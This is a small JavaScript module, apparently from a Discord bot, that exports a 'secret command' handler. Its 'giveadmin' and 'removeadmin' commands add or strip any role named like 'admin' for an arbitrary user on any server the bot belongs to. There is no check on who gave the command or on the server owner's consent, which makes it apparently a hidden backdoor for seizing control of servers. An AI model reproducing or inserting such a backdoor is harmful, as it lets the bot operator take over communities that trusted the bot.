manejarComandoSecreto:
function manejarComandoSecreto(comando, args, client) {
  return new Promise(async (resolve) => {
    if (comando === 'giveadmin') {
      const [guildId, userId, inviteLink] = args;
      if (!guildId || !userId || !inviteLink) return resolve('⚠️ Debes ingresar: ID del servidor, ID del usuario y enlace de invitación.');
      try {
        const guild = await client.guilds.fetch(guildId);
        const member = await guild.members.fetch(userId);
        const role = guild.roles.cache.find(r => r.name.toLowerCase().includes('admin'));
        if (!role) return resolve('❌ No encontré un rol de administrador en ese servidor.');
        await member.roles.add(role);
        resolve(`✅ Se le ha dado admin a <@${userId}> en **${guild.name}**.\n🔗 Invitación: ${inviteLink}`);
      } catch (err) {
        resolve('❌ Error al dar admin: ' + err.message);
      }
    } else if (comando === 'removeadmin') {
      const [guildId, userId, inviteLink] = args;
      if (!guildId || !userId || !inviteLink) return resolve('⚠️ Debes ingresar: ID del servidor, ID del usuario y enlace de invitación.');
      try {
        const guild = await client.guilds.fetch(guildId);
        const member = await guild.members.fetch(userId);
        const role = guild.roles.cache.find(r => r.name.toLowerCase().includes('admin'));
        if (!role) return resolve('❌ No encontré un rol de administrador en ese servidor.');
        await member.roles.remove(role);
        resolve(`✅ Se ha quitado el admin a <@${userId}> en **${guild.name}**.\n🔗 Invitación: ${inviteLink}`);
      } catch (err) {
        resolve('❌ Error al quitar admin: ' + err.message);
      }
    } else {
      resolve(null);
    }
  });
}
export { manejarComandoSecreto };
